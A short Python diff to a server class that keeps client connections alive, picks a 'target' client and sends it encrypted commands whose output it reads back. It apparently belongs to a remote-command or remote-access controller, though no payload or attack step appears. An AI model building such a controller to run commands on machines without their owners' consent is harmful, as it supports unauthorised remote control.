@@ -35,7 +35,7 @@ class Server(object):
         ) 
 
 
-    def ping(self, conn, timeout=5):
+    def ping(self, conn, ip, timeout=5):
         try:
             conn.send(randombyte())
             conn.settimeout(timeout)
@@ -45,6 +45,8 @@ class Server(object):
                 return True
         except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
             pass
+        if self.connections.isconnected(ip):
+            return True
         return False
     
 
@@ -53,14 +55,18 @@ class Server(object):
             ip = conn.getpeername()[0]
             while True:
                 if not self.connections.isconnected(ip):
-                    self.ping(conn=conn,timeout=timeout)
-                    self.connections.removeConnection(conn)
+                    print("Status Completed and async")
+                    if not self.ping(conn=conn,ip=ip,timeout=timeout):
+                        print('NotPing')
+                        self.connections.removeConnection(conn)
+                time.sleep(self.sleepPerPing)
         threading.Thread(target=__internal__).start()
                 
     
     def onConnect(self,conn,addr):
         clientInfo = self.retriveClientInfo(conn)
         self.connections.insertNewConnction(conn, clientInfo)
+        self.keepAlive(conn=conn)
         while True:
             if self.connections.connctTo == addr[0]:
                 self.connections.connectToTarget(conn)
@@ -90,7 +96,6 @@ class Server(object):
     
 
     def retriveCommand(self,connection, command):
-        print(f'key is: {connection.aes.key}\niv:{connection.aes.iv}')
         command = self.sendMsg(connection,command.encode())
         return self.recvMsg(connection).decode(errors='replace')
         
